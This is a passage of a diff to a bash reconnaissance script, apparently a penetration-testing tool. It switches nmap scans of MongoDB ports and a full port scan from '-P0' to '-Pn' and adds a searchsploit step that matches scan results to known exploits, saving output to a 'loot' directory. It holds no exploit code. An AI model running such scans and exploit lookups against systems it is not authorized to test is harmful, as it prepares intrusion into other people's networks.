-	nmap -sV  -p 27018 -P0 -T5 --script=mongodb* $TARGET
+	nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET
 fi
 
 if [ -z "$port_27019" ];
@@ -1515,7 +1531,7 @@ then
 	echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
-	nmap -sV  -p 27019 -P0 -T5 --script=mongodb* $TARGET
+	nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET
 fi
 
 if [ -z "$port_28017" ];
@@ -1523,7 +1539,7 @@ then
 	echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
-	nmap -sV  -p 28017 -P0 -T5 --script=mongodb* $TARGET
+	nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET
 fi
 
 if [ -z "$port_49152" ];
@@ -1543,7 +1559,9 @@ if [ "$FULLNMAPSCAN" = "0" ]; then
 	echo -e "$OKGREEN + -- ----------------------------=[Skipping Full NMap Port Scan]=------------ -- +$RESET"
 else
 	echo -e "$OKGREEN + -- ----------------------------=[Performing Full NMap Port Scan]=---------- -- +$RESET"
-	nmap -P0 -T4 -sV  -O -v -p 1-65355 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	nmap -Pn -T4 -sV  -O -v -p 1-65355 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+	echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits via Searchsploit]=--- -- +$RESET"
+	searchsploit --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
 fi
 
 if [ "$AUTOBRUTE" = "0" ]; then
